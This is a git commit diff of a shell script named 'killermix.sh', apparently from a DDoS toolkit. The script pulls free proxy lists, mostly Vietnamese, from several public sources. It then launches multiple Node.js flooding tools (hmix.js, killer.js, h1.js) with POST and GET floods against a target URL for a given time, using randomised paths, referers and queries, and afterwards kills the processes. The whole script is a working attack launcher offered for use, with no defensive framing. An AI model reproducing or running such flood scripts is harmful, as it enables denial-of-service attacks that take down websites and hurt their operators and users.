729822ce57d8e534a808ef241360af577f50f923
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-15 17:32:20 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -6,23 +6,23 @@
 URL=$1
 TIME=$2
 
-# https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt
-# https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt
-# https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${type}
-# Tải proxy loại HTTP, HTTPS vào live.txt 
+# Tải proxy vào live.txt cho cả HTTP, HTTPS
 > live.txt
 for type in http https; do
-  curl -s "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt" >> live.txt
+  for url in
+    https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt
+    https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt
+    https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${type}; do
+    curl -s $url >> live.txt
+  done
 done
 
 # Chạy các script node
-node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
-
-node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
-
-node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
-node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
+node hmix.js -m POST -u $URL -s $TIME -p live.txt -t 1 --full true -d false &
+node killer.js POST $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
+node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
+node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &
 
 # Dừng toàn bộ sau khi chạy xong TIME giây
-sleep "$TIME"
+sleep $TIME
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
